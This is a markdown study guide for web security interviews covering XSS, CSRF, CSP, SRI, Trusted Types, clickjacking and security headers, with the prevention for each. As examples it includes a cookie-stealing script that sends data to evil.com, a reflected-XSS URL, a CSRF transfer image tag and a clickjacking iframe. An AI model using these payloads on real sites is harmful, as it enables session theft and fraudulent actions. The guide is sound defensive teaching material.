# Web Security Deep Dive

This guide covers the critical web security topics that come up in interviews — XSS, CSRF, CSP, and essential HTTP security headers. For CORS and Same-Site cookie details, see [CORS](cors.md) and [Cookies & Storage](cookies-storage.md).

## Cross-Site Scripting (XSS)

XSS attacks inject malicious scripts into web pages viewed by other users. There are three types:

### Stored XSS

Malicious script is **persisted on the server** (e.g., in a database) and served to all users:

```html
<!-- Attacker posts a comment containing: -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

<!-- Every user who views the comment executes this script -->
```

**Prevention:** Sanitize and escape all user input before storing and rendering. Never use `innerHTML` with user content. Use `textContent` or a sanitizer like DOMPurify.

### Reflected XSS

Malicious script is **in the URL or request parameter** and reflected back in the response:

```
https://example.com/search?q=<script>alert(1)</script>
```

If the server renders the query parameter without escaping, the script executes.

**Prevention:** Escape output on the server. Use `encodeURIComponent()` for dynamic URL parameters. Enable CSP to block inline scripts.

### DOM-Based XSS

The vulnerability exists entirely in **client-side JavaScript** — the malicious payload is processed by JS without server involvement:

```javascript
// Vulnerable: reading from location.hash and inserting into DOM
document.getElementById('output').innerHTML = location.hash.slice(1);

// Safe alternative
document.getElementById('output').textContent = location.hash.slice(1);
```

**Prevention:** Use `textContent` over `innerHTML`. Use `DOMPurify.sanitize()` for HTML content. Avoid `eval()`, `document.write()`, and `setTimeout(string)`.

### XSS Prevention Summary

| Technique | Effective Against |
|-----------|-------------------|
| `textContent` over `innerHTML` | DOM-based XSS |
| Output encoding (HTML entities) | Stored + Reflected XSS |
| DOMPurify sanitization | All types (for rich content) |
| Content Security Policy | All types (defense in depth) |
| HttpOnly cookies | Prevents cookie theft via XSS |
| Trusted Types API | DOM-based XSS |

## Cross-Site Request Forgery (CSRF)

CSRF tricks a user's browser into making authenticated requests to a different site without their knowledge:

```html
<!-- Attacker's site: evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
<!-- If the user is logged into bank.com, cookies are sent automatically -->
```

### CSRF Prevention

**1. CSRF Tokens (Synchronizer Token Pattern):**
```javascript
// Server generates a random token per session
// Token is embedded in forms and validated on submission
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="a1b2c3d4e5">
  <!-- ... -->
</form>
```

**2. SameSite Cookies:** Set `SameSite=Strict` or `SameSite=Lax` on session cookies (see [Cookies & Storage](cookies-storage.md)).

**3. Double Submit Cookie:** Set the token in both a cookie and a request header/body. The server verifies they match — a cross-origin request can't read the cookie to place it in the custom header.

```javascript
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCookie('csrf_token') // JS can read non-HttpOnly cookies
  },
  body: JSON.stringify({ to: 'attacker', amount: 10000 })
});
```

## Content Security Policy (CSP)

CSP is an HTTP response header that controls which resources the browser can load, preventing XSS and data injection attacks:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src * data:; connect-src 'self' https://api.example.com; frame-ancestors 'none'
```

### Key Directives

| Directive | Controls | Example Values |
|-----------|----------|---------------|
| `default-src` | Fallback for all fetch directives | `'self'`, `https:` |
| `script-src` | JavaScript sources | `'self'`, `'nonce-xyz'`, `'strict-dynamic'` |
| `style-src` | CSS sources | `'self'`, `'unsafe-inline'` |
| `img-src` | Image sources | `*`, `data:`, `'self'` |
| `connect-src` | fetch, XHR, WebSocket targets | `'self'`, `https://api.com` |
| `frame-ancestors` | Who can embed this page | `'none'`, `'self'` |
| `base-uri` | Allowed `<base>` URLs | `'self'` |
| `form-action` | Allowed form targets | `'self'` |

### Common Configurations

**Strict (prevents all inline scripts):**
```
script-src 'self' 'nonce-random123'
```

**Report-only mode (doesn't block, just reports):**
```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violations
```

## Subresource Integrity (SRI)

SRI ensures that externally hosted scripts and styles haven't been tampered with:

```html
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
  crossorigin="anonymous">
</script>
```

The browser computes a hash of the downloaded resource and refuses to execute it if the hash doesn't match. Use SRI for any third-party CDN resources.

## Trusted Types

Trusted Types is a browser API that prevents DOM-based XSS by requiring dangerous sinks (`innerHTML`, `eval`, `document.write`) to accept only specially created objects instead of plain strings:

```javascript
// Enable via CSP
// Content-Security-Policy: require-trusted-types-for 'script'

// Create a policy that sanitizes HTML
const escapePolicy = trustedTypes.createPolicy('escape', {
  createHTML(str) {
    return DOMPurify.sanitize(str);
  }
});

// Now innerHTML only accepts TrustedHTML objects
element.innerHTML = escapePolicy.createHTML(userInput);
```

## Clickjacking

An attacker embeds your site in a transparent iframe and tricks users into clicking hidden buttons:

```html
<!-- Attacker's page -->
<iframe src="https://bank.com/transfer" style="opacity:0; position:absolute; top:0; left:0;"></iframe>
<button style="position:absolute; top:100px; left:200px;">Click to Win!</button>
```

**Prevention:**
```http
X-Frame-Options: DENY
# or
X-Frame-Options: SAMEORIGIN
```

CSP's `frame-ancestors` directive is the modern replacement and supports multiple origins.

## HTTP Security Headers Reference

| Header | Purpose | Recommended Value |
|--------|---------|-----------------|
| `Content-Security-Policy` | Prevents XSS, controls resource loading | See directives above |
| `X-Frame-Options` | Prevents clickjacking | `DENY` or `SAMEORIGIN` |
| `X-Content-Type-Options` | Prevents MIME sniffing | `nosniff` |
| `Strict-Transport-Security` | Forces HTTPS | `max-age=31536000; includeSubDomains; preload` |
| `Referrer-Policy` | Controls referrer information | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Controls browser features | `camera=(), microphone=(), geolocation=(self)` |
| `Cross-Origin-Opener-Policy` | Isolates browsing context | `same-origin` |
| `Cross-Origin-Resource-Policy` | Controls cross-origin resource sharing | `same-origin` |

**Quick win:** Use the [Helmet.js](https://helmetjs.github.io/) middleware (Express) to set all security headers automatically.

## Interview Questions

**Q: Explain the three types of XSS and how to prevent each.**
A: Stored XSS persists malicious script on the server (sanitize before storing). Reflected XSS reflects user input in the response without escaping (escape output). DOM-based XSS processes untrusted data in client-side JS (use `textContent`, DOMPurify). Defense in depth: CSP blocks inline scripts, HttpOnly cookies prevent session theft.

**Q: How does a CSRF attack work and how do you prevent it?**
A: An attacker tricks the user's browser into making an authenticated request to a vulnerable site (e.g., via `<img>` tag pointing to a transfer endpoint). Prevent with: CSRF tokens (synchronizer pattern), SameSite cookies (Lax/Strict), or double-submit cookie pattern. CORS alone doesn't prevent CSRF — cookies are sent regardless.

**Q: What is Content Security Policy and why is it important?**
A: CSP is an HTTP header that whitelists allowed resource sources (scripts, styles, images). It prevents XSS by blocking inline scripts and unauthorized external scripts. A strict CSP with nonces is one of the strongest defenses against XSS attacks.

**Q: What is Subresource Integrity and when should you use it?**
A: SRI adds a hash attribute to `<script>` and `<link>` tags for external resources. The browser verifies the downloaded resource matches the hash. Use it for any CDN-hosted libraries to protect against supply chain attacks or CDN compromises.

## References

- [MDN — Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [web.dev — Trusted Types](https://web.dev/trusted-types/)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
